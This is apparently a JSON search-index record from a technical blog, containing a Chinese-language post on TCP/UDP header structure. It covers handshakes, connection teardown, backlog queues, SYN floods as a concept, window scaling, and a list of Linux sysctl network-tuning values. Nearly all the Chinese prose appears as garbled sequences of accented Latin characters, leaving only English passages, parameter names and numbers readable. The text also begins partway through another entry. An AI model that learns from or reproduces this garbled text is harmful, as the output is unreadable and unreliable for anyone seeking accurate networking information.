ç”¨cè¯­è¨€å®ç°selectçš„client-serveræ¨¡å‹","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"tcpå’ŒudpåŒ…ç»“æ„åˆ†æ","date":"2018-12-03T13:42:25.000Z","path":"2018/12/03/2018-12-03-packet-structure-of-tcp-and-udp/","text":"æœ¬æ–‡åªé’ˆå¯¹ipv4ç½‘ç»œè¿›è¡Œåˆ†æ å¤šæ•°å†…å®¹æ¥è‡ªTCP æŠ¥æ–‡ç»“æ„åŒä¸€å°æœºå™¨ä¸Šçš„ä¸¤ä¸ªè¿›ç¨‹ï¼Œå¯ä»¥é€šè¿‡ç®¡é“ï¼Œå…±äº«å†…å­˜ï¼Œä¿¡å·é‡ï¼Œæ¶ˆæ¯é˜Ÿåˆ—ç­‰æ–¹å¼è¿›è¡Œé€šä¿¡ã€‚é€šä¿¡çš„ä¸€ä¸ªåŸºæœ¬å‰ææ˜¯æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰å”¯ä¸€çš„æ ‡è¯†ï¼Œåœ¨åŒä¸€å°æœºå™¨ä¸Šï¼Œä½¿ç”¨pidå°±å¯ä»¥äº†ã€‚ä¸¤å°ä¸åŒçš„è®¡ç®—æœºä¹‹é—´é€šä¿¡ï¼Œå¯ä»¥ä½¿ç”¨ipåœ°å€ + åè®® +åè®®ç«¯å£å· æ¥æ ‡è¯†ç½‘ç»œä¸­çš„å”¯ä¸€è¿›ç¨‹ã€‚ TCPtcpç”¨16ä½ç«¯å£å·æ¥æ ‡è¯†ä¸€ä¸ªç«¯å£ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªbytes(65536å°±è¿™ä¹ˆæ¥çš„)ã€‚ ä»¥ä¸‹å›¾ç‰‡ç›—è‡ªchinaunixä¸€ç¯‡è®²è§£raw socketçš„æ–‡ç«  è¿™æ˜¯IP packet è¿™æ˜¯TCP header è¿™æ˜¯IP header è¿™æ˜¯mac header ä»€ä¹ˆæ˜¯æŠ¥æ–‡ï¼Ÿä¾‹å¦‚ä¸€ä¸ª 100kb çš„ HTML æ–‡æ¡£éœ€è¦ä¼ é€åˆ°å¦å¤–ä¸€å°è®¡ç®—æœºï¼Œå¹¶ä¸ä¼šæ•´ä¸ªæ–‡æ¡£ç›´æ¥ä¼ é€è¿‡å»ï¼Œå¯èƒ½ä¼šåˆ‡å‰²æˆå‡ ä¸ªéƒ¨åˆ†ï¼Œæ¯”å¦‚å››ä¸ªåˆ†åˆ«ä¸º 25kb çš„æ•°æ®æ®µã€‚è€Œæ¯ä¸ªæ•°æ®æ®µå†åŠ ä¸Šä¸€ä¸ª TCP é¦–éƒ¨ï¼Œå°±ç»„æˆäº† TCP æŠ¥æ–‡ã€‚ä¸€å…±å››ä¸ª TCP æŠ¥æ–‡ï¼Œå‘é€åˆ°å¦å¤–ä¸€ä¸ªç«¯ã€‚å¦å¤–ä¸€ç«¯æ”¶åˆ°æ•°æ®åŒ…ï¼Œç„¶åå†å‰”é™¤ TCP é¦–éƒ¨ï¼Œç»„è£…èµ·æ¥ã€‚ç­‰åˆ°å››ä¸ªæ•°æ®åŒ…éƒ½æ”¶åˆ°äº†ï¼Œå°±èƒ½è¿˜åŸå‡ºæ¥ä¸€ä¸ªå®Œæ•´çš„ HTML æ–‡æ¡£äº†ã€‚åœ¨ OSI çš„ä¸ƒå±‚åè®®ä¸­ï¼Œç¬¬äºŒå±‚ï¼ˆæ•°æ®é“¾è·¯å±‚ï¼‰çš„æ•°æ®å«ã€ŒFrameã€ï¼Œç¬¬ä¸‰å±‚ï¼ˆç½‘ç»œå±‚ï¼‰ä¸Šçš„æ•°æ®å«ã€ŒPacketã€ï¼Œç¬¬å››å±‚ï¼ˆä¼ è¾“å±‚ï¼‰çš„æ•°æ®å«ã€ŒSegmentã€ã€‚TCP æŠ¥æ–‡ (Segment)ï¼ŒåŒ…æ‹¬é¦–éƒ¨å’Œæ•°æ®éƒ¨åˆ†ã€‚ TCP æŠ¥æ–‡æ®µé¦–éƒ¨çš„å‰20ä¸ªå­—èŠ‚æ˜¯å›ºå®šçš„ï¼Œåé¢æœ‰ 4N å­—èŠ‚æ˜¯æ ¹æ®éœ€è¦è€Œå¢åŠ çš„ã€‚TCP çš„é¦–éƒ¨åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š æºç«¯å£ source port ç›®çš„ç«¯å£ destination port åºå· sequence number ç¡®è®¤å· acknowledgment number æ•°æ®åç§» offset ä¿ç•™ reserved æ ‡å¿—ä½ tcp flags çª—å£å¤§å° window size æ£€éªŒå’Œ checksum ç´§æ€¥æŒ‡é’ˆ urgent pointer é€‰é¡¹ tcp options è¿æ¥å»ºç«‹è¿‡ç¨‹TCP è¿æ¥çš„å»ºç«‹é‡‡ç”¨å®¢æˆ·æœåŠ¡å™¨æ–¹å¼ï¼Œä¸»åŠ¨å‘èµ·è¿æ¥å»ºç«‹çš„ä¸€æ–¹å«å®¢æˆ·ç«¯ï¼ˆClientï¼‰ï¼Œè¢«åŠ¨ç­‰å¾…è¿æ¥å»ºç«‹çš„ä¸€æ–¹å«æœåŠ¡å™¨ï¼ˆServerï¼‰ã€‚æœ€åˆçš„æ—¶å€™ï¼Œä¸¤ç«¯éƒ½å¤„äº CLOSED çš„çŠ¶æ€ï¼Œç„¶åæœåŠ¡å™¨æ‰“å¼€äº† TCP æœåŠ¡ï¼Œè¿›å…¥ LISTEN çŠ¶æ€ï¼Œç›‘å¬ç‰¹å®šç«¯å£ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„ TCP è¯·æ±‚ã€‚ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼š å®¢æˆ·ç«¯ä¸»åŠ¨æ‰“å¼€è¿æ¥ï¼Œå‘é€ TCP æŠ¥æ–‡ï¼Œè¿›è¡Œç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼Œç„¶åè¿›å…¥ SYN_SEND çŠ¶æ€ï¼Œç­‰å¾…æœåŠ¡å™¨å‘å›ç¡®è®¤æŠ¥æ–‡ã€‚è¿™æ—¶é¦–éƒ¨çš„åŒæ­¥ä½ SYN = 1ï¼ŒåŒæ—¶åˆå§‹åŒ–ä¸€ä¸ªåºå· Sequence Number = Jã€‚TCP è§„å®šï¼ŒSYN æŠ¥æ–‡æ®µä¸èƒ½æºå¸¦æ•°æ®ï¼Œä½†ä¼šæ¶ˆè€—ä¸€ä¸ªåºå·ã€‚ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼š æœåŠ¡å™¨æ”¶åˆ°äº† SYN æŠ¥æ–‡ï¼Œå¦‚æœåŒæ„å»ºç«‹è¿æ¥ï¼Œåˆ™å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªç¡®è®¤æŠ¥æ–‡ï¼Œç„¶åæœåŠ¡å™¨è¿›å…¥ SYN_RCVD çŠ¶æ€ã€‚è¿™æ—¶é¦–éƒ¨çš„ SYN = 1ï¼ŒACK = 1ï¼Œè€Œç¡®è®¤å· Acknowledgement Number = J + 1ï¼ŒåŒæ—¶ä¹Ÿä¸ºè‡ªå·±åˆå§‹åŒ–ä¸€ä¸ªåºå· Sequence Number = Kã€‚è¿™ä¸ªæŠ¥æ–‡åŒæ ·ä¸æºå¸¦æ•°æ®ã€‚ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ°äº†æœåŠ¡å™¨å‘è¿‡æ¥çš„ç¡®è®¤æŠ¥æ–‡ï¼Œè¿˜è¦å‘æœåŠ¡å™¨ç»™å‡ºç¡®è®¤ï¼Œç„¶åè¿›å…¥ ESTABLISHED çŠ¶æ€ã€‚è¿™æ—¶é¦–éƒ¨çš„ SYN ä¸å†ç½®ä¸º 1ï¼Œè€Œ ACK = 1ï¼Œç¡®è®¤å· Acknowledgement Number = K + 1ï¼Œåºå· Sequence Number = J + 1ã€‚ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼Œä¸€èˆ¬ä¼šæºå¸¦çœŸæ­£éœ€è¦ä¼ è¾“çš„æ•°æ®ï¼Œå½“æœåŠ¡å™¨æ”¶åˆ°è¯¥æ•°æ®æŠ¥æ–‡çš„æ—¶å€™ï¼Œå°±ä¼šåŒæ ·è¿›å…¥ ESTABLISHED çŠ¶æ€ã€‚ æ­¤æ—¶ï¼ŒTCP è¿æ¥å·²ç»å»ºç«‹ã€‚å¯¹äºå»ºç«‹è¿æ¥çš„ä¸‰æ¬¡æ¡æ‰‹ï¼Œä¸»è¦ç›®çš„æ˜¯åˆå§‹åŒ–åºå· Sequence Numberï¼Œå¹¶ä¸”é€šä¿¡çš„åŒæ–¹éƒ½éœ€è¦å‘ŠçŸ¥å¯¹æ–¹è‡ªå·±çš„åˆå§‹åŒ–åºå·ï¼Œæ‰€ä»¥è¿™ä¸ªè¿‡ç¨‹ä¹Ÿå« SYNã€‚è¿™ä¸ªåºå·è¦ä½œä¸ºä»¥åçš„æ•°æ®é€šä¿¡çš„åºå·ï¼Œä»¥ä¿è¯åº”ç”¨å±‚æ¥æ”¶åˆ°çš„æ•°æ®ä¸ä¼šå› ä¸ºç½‘ç»œä¸Šçš„ä¼ è¾“é—®é¢˜è€Œä¹±åºï¼Œå› ä¸ºTCP ä¼šç”¨è¿™ä¸ªåºå·æ¥æ‹¼æ¥æ•°æ®ã€‚ TCP Flood æ”»å‡»çŸ¥é“äº† TCP å»ºç«‹ä¸€ä¸ªè¿æ¥ï¼Œéœ€è¦è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ã€‚ä½†å¦‚æœä½ å¼€å§‹æ€è€ƒã€Œä¸‰æ¬¡æ¡æ‰‹çš„å¿…è¦æ€§ã€çš„æ—¶å€™ï¼Œå°±ä¼šçŸ¥é“ï¼Œå…¶å®ç½‘ç»œæ˜¯å¾ˆå¤æ‚çš„ï¼Œä¸€ä¸ªä¿¡æ¯åœ¨é€”ä¸­ä¸¢å¤±çš„å¯èƒ½æ€§æ˜¯æœ‰çš„ã€‚å¦‚æœæ•°æ®ä¸¢å¤±äº†ï¼Œé‚£ä¹ˆï¼Œå°±éœ€è¦é‡æ–°å‘é€ï¼Œè¿™æ—¶å€™å°±è¦çŸ¥é“æ•°æ®æ˜¯å¦çœŸçš„é€è¾¾äº†ã€‚è¿™å°±æ˜¯ä¸‰æ¬¡æ¡æ‰‹çš„å¿…è¦æ€§ã€‚ä½†æ˜¯å†å‘æ·±ä¸€å±‚æ€è€ƒï¼Œä½ ç»™æˆ‘å‘ä¿¡æ¯ï¼Œæˆ‘æ”¶åˆ°äº†ï¼Œæˆ‘å›å¤ï¼Œå› ä¸ºæˆ‘æ˜¯å›å­ã€‚å¦‚æœæ˜¯å°äººï¼Œä½ ç»™æˆ‘å‘ä¿¡æ¯ï¼Œæˆ‘å°±ç®—æ”¶åˆ°äº†ï¼Œæˆ‘ä¹Ÿä¸å›å¤ï¼Œä½ å°±ä¸€ç›´ç­‰æˆ‘ç€æˆ‘çš„å›å¤ã€‚é‚£ä¹ˆå¾ˆå¤šå°äººéƒ½è¿™æ ·åšï¼Œä½ å°±è¦ä¸€ç›´è®°ä½ä½ åœ¨ç­‰å¾…ç€å°äºº1å·ã€å°äºº2å·ã€å°äºº3å·â€¦â€¦ç›´åˆ°ä½ çš„è„‘å®¹é‡çˆ†æ£šï¼Œçƒ§åè„‘è¢‹ã€‚é»‘å®¢å°±æ˜¯åˆ©ç”¨è¿™æ ·çš„è®¾è®¡ç¼ºé™·ï¼Œå®æ–½ TCP Flood æ”»å‡»ï¼Œå±äº DDOS æ”»å‡»çš„ä¸€ç§ã€‚(syn flood) TCPè¿›é˜¶ å››æ¬¡æŒ¥æ‰‹ï¼Œé‡Šæ”¾è¿æ¥TCP æœ‰ä¸€ä¸ªç‰¹åˆ«çš„æ¦‚å¿µå«åšåŠå…³é—­ï¼Œè¿™ä¸ªæ¦‚å¿µæ˜¯è¯´ï¼ŒTCP çš„è¿æ¥æ˜¯å…¨åŒå·¥ï¼ˆå¯ä»¥åŒæ—¶å‘é€å’Œæ¥æ”¶ï¼‰çš„è¿æ¥ï¼Œå› æ­¤åœ¨å…³é—­è¿æ¥çš„æ—¶å€™ï¼Œå¿…é¡»å…³é—­ä¼ é€å’Œæ¥æ”¶ä¸¤ä¸ªæ–¹å‘ä¸Šçš„è¿æ¥ã€‚å®¢æˆ·ç«¯ç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªæºå¸¦ FIN çš„ TCP ç»“æŸæŠ¥æ–‡æ®µï¼Œç„¶åæœåŠ¡å™¨è¿”å›ç»™å®¢æˆ·ç«¯ä¸€ä¸ª ç¡®è®¤æŠ¥æ–‡æ®µï¼ŒåŒæ—¶å‘é€ä¸€ä¸ª ç»“æŸæŠ¥æ–‡æ®µï¼Œå½“å®¢æˆ·ç«¯å›å¤ä¸€ä¸ª ç¡®è®¤æŠ¥æ–‡æ®µ ä¹‹åï¼Œè¿æ¥å°±ç»“æŸäº†ã€‚é‡Šæ”¾è¿æ¥è¿‡ç¨‹åœ¨ç»“æŸä¹‹å‰ï¼Œé€šä¿¡åŒæ–¹éƒ½æ˜¯å¤„äº ESTABLISHED çŠ¶æ€ï¼Œç„¶åå…¶ä¸­ä¸€æ–¹ä¸»åŠ¨æ–­å¼€è¿æ¥ã€‚ä¸‹é¢å‡å¦‚å®¢æˆ·ç«¯å…ˆä¸»åŠ¨æ–­å¼€è¿æ¥ã€‚ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ç»“æŸæŠ¥æ–‡æ®µï¼Œç„¶åè¿›å…¥ FIN_WAIT_1 çŠ¶æ€ã€‚æ­¤æŠ¥æ–‡æ®µ FIN = 1ï¼Œ Sequence Number = Mã€‚ç¬¬äºŒæ¬¡æŒ¥æ‰‹ï¼šæœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯çš„ç»“æŸæŠ¥æ–‡æ®µï¼Œç„¶åå‘é€ç¡®è®¤æŠ¥æ–‡æ®µï¼Œè¿›å…¥ CLOSE_WAIT çŠ¶æ€(é€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ª CLOSE_WAIT ä¼šç»´æŒè‡³å°‘ 2 ä¸ªå°æ—¶çš„æ—¶é—´)ã€‚æ­¤æŠ¥æ–‡æ®µ ACK = 1ï¼Œ Sequence Number = M + 1ã€‚å®¢æˆ·ç«¯æ”¶åˆ°è¯¥æŠ¥æ–‡ï¼Œä¼šè¿›å…¥ FIN_WAIT_2 çŠ¶æ€ã€‚ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹ï¼šåŒæ—¶æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€ç»“æŸæŠ¥æ–‡æ®µï¼Œç„¶åè¿›å…¥ LAST_ACK çŠ¶æ€ã€‚æ­¤æŠ¥æ–‡æ®µ FIN = 1ï¼ŒSequence Number = Nã€‚ç¬¬å››æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯çš„ç»“æŸæŠ¥æ–‡æ®µï¼Œç„¶åå‘é€ç¡®è®¤æŠ¥æ–‡æ®µï¼Œè¿›å…¥ TIME_WAIT çŠ¶æ€ï¼Œç»è¿‡ 2MSL ä¹‹åï¼Œè‡ªåŠ¨è¿›å…¥ CLOSED çŠ¶æ€ã€‚æ­¤æŠ¥æ–‡æ®µ ACK = 1, Sequence Number = N + 1ã€‚æœåŠ¡ç«¯æ”¶åˆ°è¯¥æŠ¥æ–‡ä¹‹åï¼Œè¿›å…¥ CLOSED çŠ¶æ€ã€‚å…³äº TIME_WAIT è¿‡æ¸¡åˆ° CLOSED çŠ¶æ€è¯´æ˜ï¼šä» TIME_WAIT è¿›å…¥ CLOSED éœ€è¦ç»è¿‡ 2MSLï¼Œå…¶ä¸­ MSL å°±å«åš æœ€é•¿æŠ¥æ–‡æ®µå¯¿å‘½ï¼ˆMaxinum Segment Lifetimeï¼‰ï¼Œæ ¹æ® RFC 793 å»ºè®®è¯¥å€¼è¿™æ˜¯ä¸º 2 åˆ†é’Ÿï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦ç»è¿‡ 4 åˆ†é’Ÿï¼Œæ‰è¿›å…¥ CLOSED çŠ¶æ€ã€‚ è¿™é‡Œè¿˜åªæ˜¯tcpå±‚é¢ï¼Œå¦‚æœåŠ ä¸Štlsåˆå§‹åŒ–æ¡æ‰‹ï¼Œè¿™ä¸ªé€Ÿåº¦ä¼šæ›´æ…¢ä¸€äº›ä¸‹é¢ä»QUIC åœ¨å¾®åšä¸­çš„è½åœ°æ€è€ƒæ–‡ä¸­æ‘˜æŠ„ä¸€éƒ¨åˆ†æ‰¹åˆ¤tcp TCP åè®®åœ¨å»ºç«‹è¿æ¥æ—¶ï¼Œéœ€è¦ç»å†è¾ƒä¸ºæ¼«é•¿çš„ä¸‰æ¬¡æ¡æ‰‹è¡Œä¸ºï¼Œè€Œåœ¨å…³é—­æ—¶ï¼Œä¹Ÿæœ‰ç¨æ˜¾å†—ä½™çš„ 4 æ¬¡æ‘†æ‰‹ã€‚è€Œ HTTPS åˆå§‹è¿æ¥éœ€è¦è‡³å°‘ 2 ä¸ª RTT äº¤äº’ï¼ˆæ·»åŠ äº†æ¡æ‰‹ç¼“å­˜å°±ä¼šå˜æˆäº† 1-RTTï¼Œè¿™é‡ŒæŒ‡çš„æ˜¯ TLS 1.2ï¼‰ï¼Œå¤–åŠ  TCP è‡ªèº«æ¡æ‰‹æµç¨‹ï¼Œæœ€å°‘éœ€è¦ 3 æ¬¡ RTT å¾€è¿”ï¼Œæ‰èƒ½å¤Ÿå®Œæ•´å»ºç«‹è¿æ¥ã€‚è€Œ QUIC åè®®å±‚é¢ç•Œå®šäº† 1-2 ä¸ª RTT æ¡æ‰‹æµç¨‹ï¼Œå†æ¬¡è¿æ¥ä¸º 0-RTT æ¡æ‰‹ä¼˜åŒ–æµç¨‹ï¼ˆä½†éœ€è¦æ·»åŠ æ¡æ‰‹ç¼“å­˜ï¼‰ å…³äºtcp read/write bufferï¼Œshadowsocksçš„å‚æ•°ä¼˜åŒ–æåˆ°äº†ä¸€äº›ä¸œè¥¿ # max open files fs.file-max = 1024000 # max read buffer net.core.rmem_max = 67108864 # max write buffer net.core.wmem_max = 67108864 # default read buffer net.core.rmem_default = 65536 # default write buffer net.core.wmem_default = 65536 # max processor input queue net.core.netdev_max_backlog = 4096 # max backlog net.core.somaxconn = 4096 # resist SYN flood attacks net.ipv4.tcp_syncookies = 1 # reuse timewait sockets when safe net.ipv4.tcp_tw_reuse = 1 # turn off fast timewait sockets recycling net.ipv4.tcp_tw_recycle = 0 # short FIN timeout net.ipv4.tcp_fin_timeout = 30 # short keepalive time net.ipv4.tcp_keepalive_time = 1200 # outbound port range net.ipv4.ip_local_port_range = 10000 65000 # max SYN backlog net.ipv4.tcp_max_syn_backlog = 4096 # max timewait sockets held by system simultaneously net.ipv4.tcp_max_tw_buckets = 5000 # TCP receive buffer net.ipv4.tcp_rmem = 4096 87380 67108864 # TCP write buffer net.ipv4.tcp_wmem = 4096 65536 67108864 # turn on path MTU discovery net.ipv4.tcp_mtu_probing = 1 # for high-latency network net.ipv4.tcp_congestion_control = hybla # forward ipv4 net.ipv4.ip_forward = 1 å†…æ ¸æ–‡æ¡£å¯¹äºè¿™äº›å‚æ•°çš„å®šä¹‰æ³¨æ„ï¼Œè¿™äº›å‚æ•°ä¿®æ”¹äº†ä¼šå½±å“æ‰€æœ‰çš„è¿›ç¨‹ï¼Œä¿®æ”¹è¿˜æ˜¯æ…é‡ä¸€äº› /proc/sys/kernel/pid_max ## å…¨å±€å¯¹pidæ•°é‡çš„é™åˆ¶ /proc/sys/kernel/threads-max ## å¯ä»¥åˆ›å»ºçš„æœ€å¤§çº¿ç¨‹æ•°ï¼Œè¿™ä¸ªè·Ÿramæœ‰å…³ tcpè¿˜æœ‰ä¸€ä¸ªåŠè¿æ¥é˜Ÿåˆ—å’Œå…¨è¿æ¥é˜Ÿåˆ—åŠè¿æ¥å°±æ˜¯ä¸‰æ­¥æ¡æ‰‹çš„ç¬¬äºŒæ­¥å®Œæˆåserverç­‰clientå›å¤å…¨è¿æ¥å°±æ˜¯ä¸‰æ­¥æ¡æ‰‹å®Œæˆäº†ï¼ŒçŠ¶æ€ä¸ºestablishedçš„ å…¨è¿æ¥é˜Ÿåˆ—çš„å¤§å°å–å†³äºï¼šmin(backlog, somaxconn) . backlogæ˜¯åœ¨socketåˆ›å»ºçš„æ—¶å€™ä¼ å…¥çš„ï¼Œsomaxconnæ˜¯ä¸€ä¸ªosçº§åˆ«çš„ç³»ç»Ÿå‚æ•°ã€‚ somaxconnçš„ä½ç½®åœ¨ï¼šcat /proc/sys/net/core/somaxconn128ï¼ˆé»˜è®¤æ˜¯128ï¼Œå°±æ˜¯è¯´ä¸€ä¸ªportåŒæ—¶æœ€å¤šç»´æŒ128æ¡establishedçš„è¿æ¥ï¼Œå½“ç„¶å¯ä»¥è°ƒå¤§ä¸€ç‚¹äº†ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå…³äºserverç«¯å†…æ ¸è°ƒä¼˜çš„æ–‡ç« ï¼‰ã€‚javaçš„serverSocketä¸€ä¸ªæ„é€ å‡½æ•°é‡Œå†™æ­»äº†50ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è°ƒå¤§ç‚¹ã€‚ åŠè¿æ¥é˜Ÿåˆ—çš„å¤§å°å–å†³äºï¼šmax(64, /proc/sys/net/ipv4/tcp_max_syn_backlog)ã€‚cat /proc/sys/net/ipv4/tcp_max_syn_backlog512ä¸åŒç‰ˆæœ¬çš„osä¼šæœ‰äº›å·®å¼‚ æ³¨æ„ï¼šæ¯”å¦‚syn floods æ”»å‡»å°±æ˜¯é’ˆå¯¹åŠè¿æ¥é˜Ÿåˆ—çš„ï¼Œæ”»å‡»æ–¹ä¸åœåœ°å»ºè¿æ¥ï¼Œä½†æ˜¯å»ºè¿æ¥çš„æ—¶å€™åªåšç¬¬ä¸€æ­¥ï¼Œç¬¬äºŒæ­¥ä¸­æ”»å‡»æ–¹æ”¶åˆ°serverçš„syn+ackåæ•…æ„æ‰”æ‰ä»€ä¹ˆä¹Ÿä¸åšï¼Œå¯¼è‡´serverä¸Šè¿™ä¸ªåŠè¿æ¥é˜Ÿåˆ—æ»¡å…¶å®ƒæ­£å¸¸è¯·æ±‚æ— æ³•è¿›æ¥ å‚è€ƒé˜¿é‡Œä¸­é—´ä»¶å›¢é˜Ÿåšå®¢çš„è¿™ç¯‡æ–‡ç« ï¼Œcat /proc/sys/net/ipv4/tcp_abort_on_overflow0è¿™ä¸ªå‚æ•°é»˜è®¤ä¸º0ï¼Œ0çš„æ—¶å€™è¡¨ç¤ºå¦‚æœä¸‰æ¬¡æ¡æ‰‹ç¬¬ä¸‰æ­¥çš„æ—¶å€™å…¨è¿æ¥é˜Ÿåˆ—æ»¡äº†é‚£ä¹ˆserveræ‰”æ‰client å‘è¿‡æ¥çš„ackã€‚æŠŠtcp_abort_on_overflowä¿®æ”¹æˆ 1ï¼Œ1è¡¨ç¤ºç¬¬ä¸‰æ­¥çš„æ—¶å€™å¦‚æœå…¨è¿æ¥é˜Ÿåˆ—æ»¡äº†ï¼Œserverå‘é€ä¸€ä¸ªresetåŒ…ç»™clientï¼Œè¡¨ç¤ºåºŸæ‰è¿™ä¸ªæ¡æ‰‹è¿‡ç¨‹å’Œè¿™ä¸ªè¿æ¥è¿™ä¸ªæ—¶å€™å®¢æˆ·ç«¯å°±èƒ½è§‚å¯Ÿåˆ°connection reset by peer tcp bufferå…³é”®å­—ï¼š tcp read buffer and write bufferè¿™é‡Œè¦åˆ†congestion windowï¼ˆå‘é€æ–¹çš„windowï¼Œå¯¹åº”congestion controlï¼‰å’Œreceive window(æ¥æ”¶æ–¹çš„windowï¼Œå¯¹åº”flow control)receive window Your Network Interface Card (NIC) is performing all of the necessary tasks of collecting packets and waiting for your OS to read them. Ultimately, when you do a stream read youâ€™re pulling from the memory that your OS has reserved and constantly stores the incoming information copy into.To answer your question, yes. You are definitely doing a copy. A copy of a copy, the bits are read into a buffer within your NIC, your OS puts them somewhere, and you copy them when you do a stream read. ç”¨wiresharkæŠ“åŒ…çš„è¯ï¼Œåœ¨tcp headeré‡Œé¢æœ‰ä¸ªâ€window size valueâ€ï¼Œæ¯”æ–¹è¯´è¿™ä¸ªæ•°æ˜¯2000ï¼Œä¹Ÿå°±æ˜¯å‘æ¥è¿™ä¸ªåŒ…çš„ä¸€æ–¹å‘Šè¯‰å½“å‰æ¥å—æ–¹ï¼Œä½ ä¸‹ä¸€æ¬¡æœ€å¤šå†å‘2000byteçš„æ•°æ®è¿‡æ¥ï¼Œå†å¤šå°±è£…ä¸ä¸‹äº†ã€‚å¦‚æœæ¥æ”¶æ–¹å¤„ç†é€Ÿåº¦è·Ÿä¸ä¸Šï¼Œbufferæ…¢æ…¢å¡«æ»¡ï¼Œå°±ä¼šåœ¨ackåŒ…é‡Œè°ƒä½window sizeï¼Œå‘Šè¯‰å¯¹æ–¹å‘æ…¢ä¸€ç‚¹ã€‚clientå¤„ç†é€Ÿåº¦å¤Ÿå¿«çš„æ—¶å€™æ˜¯è¿™æ ·çš„ å¦‚æœä¸å¤Ÿå¿«çš„è¯,è¿™æ—¶å€™å°±æ˜¯clientåœ¨ackåŒ…é‡Œå‘Šè¯‰serverè‡ªå·±è·Ÿä¸ä¸Šäº† TCP Window Scalingæ³¨æ„ï¼Œwindow sizeæ˜¯åœ¨ackåŒ…é‡Œçš„,å¦å¤–,tcp headeré‡Œé¢ä¸ºè¿™ä¸ªwindow sizeå‡†å¤‡çš„ç©ºé—´æ˜¯2 bytesï¼ˆ65536 bytes,æ‰€ä»¥ä¸€ä¸ªåŒ…æœ€å¤§ä¹Ÿå°±65K?ï¼‰ã€‚è¿™æ ·å¯¹äºé‚£äº›å¤§å¸¦å®½é«˜å»¶è¿Ÿçš„è¿æ¥æ¥è¯´æ˜¯ä¸åˆ©çš„ã€‚äº‹å®å½“ç„¶æ²¡è¿™ä¹ˆç®€å•ï¼ŒRFC 1323 enable the TCP receive window to be increased exponentially(æŒ‡æ•°å¢é•¿)ã€‚è¿™ä¸ªåŠŸèƒ½æ˜¯åœ¨æ¡æ‰‹çš„æ—¶å€™äº’ç›¸å•†å®šäº†ä¸€ä¸ªå¢é•¿çš„å€æ•°(åœ¨tcpæ¡æ‰‹çš„headeré‡Œé¢æœ‰ä¸€ä¸ªwindow size scaling factor,æ¯”å¦‚ä¸‹å›¾è¿™æ ·çš„ï¼Œä¸€æ¬¡ä¹˜ä»¥4) In the image above, the sender of this packet is advertising a TCP Window of 63,792 bytes and is using a scaling factor of four. This means that that the true window size is 63,792 x 4 (255,168 bytes). Using scaling windows allows endpoints to advertise a window size of over 1GB. To use window scaling, both sides of the connection must advertise this capability in the handshake process. If one side or the other cannot support scaling, then neither will use this function. The scale factor, or multiplier, will only be sent in the SYN packets during the handshake and will be used for the life of the connection. This is one reason why it is so important to capture the handshake process when performing TCP analysis. å°±æ˜¯è¯´4è¿™ä¸ªæ•°åªä¼šå‡ºç°åœ¨æ¡æ‰‹çš„synåŒ…ä¸­ï¼Œå¹¶ä¸”åªæœ‰åœ¨åŒæ–¹éƒ½èƒ½æ”¯æŒscalingçš„å‰æä¸‹æ‰ä¼šç”¨ï¼Œè€Œä¸”è¿™ä¸ª4å°†ä¼šåœ¨è¿™æ¡è¿æ¥çš„ç”Ÿå‘½å‘¨æœŸä¸­ä¸€ç›´æ˜¯è¿™ä¸ªæ•°ï¼Œæ‰€ä»¥è¦åˆ†æçš„è¯ï¼Œé€®è¿™ä¸ªsynåŒ…å»æŠ“ã€‚ TCP Zero windowæ„æ€å°±æ˜¯è¯´ï¼Œè¿™ä¸ªwindow sizeå˜æˆ0äº†ã€‚é€šå¸¸ä¸ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Œä¸€èˆ¬æ˜¯æ¥æ”¶æ–¹çš„è¿›ç¨‹å‡ºé—®é¢˜äº†ï¼Œè¿™æ—¶å€™serverä¼šç­‰ç€ï¼Œéšç€clientçš„åº”ç”¨å±‚å¼€å§‹å¤„ç†æ•°æ®ï¼Œclientä¼šæ…¢æ…¢å‘TCP Keep-AliveåŒ…ï¼Œå¸¦ä¸Šæ–°çš„window sizeï¼Œå‘Šè¯‰serverè¯´ï¼Œè‡ªå·±æ­£åœ¨å¤„ç†æ•°æ®ï¼Œå¿«äº†å¿«äº†ã€‚ The throughput of a communication is limited by two windows: the congestion window and the receive window. The congestion window tries not to exceed the capacity of the network (congestion control); the receive window tries not to exceed the capacity of the receiver to process data (flow control). The receiver may be overwhelmed by data if for example it is very busy (such as a Web server). Each TCP segment contains the current value of the receive window. If, for example, a sender receives an ack which acknowledges byte 4000 and specifies a receive window of 10000 (bytes), the sender will not send packets after byte 14000, even if the congestion window allows it.æ€»çš„æ¥è¯´ï¼Œtcpä¼ è¾“çš„é€Ÿåº¦æ˜¯ç”±congestion window and the receive windowæ§åˆ¶çš„ï¼Œå‰è€…æ§åˆ¶å‘é€æ–¹çš„å‘é€é€Ÿåº¦ï¼Œåè€…é™åˆ¶æ¥æ”¶æ–¹çš„æ¥æ”¶é€Ÿåº¦ã€‚ å¯é æ€§äº¤ä»˜çš„å®ç°åˆ°è¿™é‡Œä¹Ÿå°±æ¸…æ¥šäº†æ»‘åŠ¨çª—å£(sliding 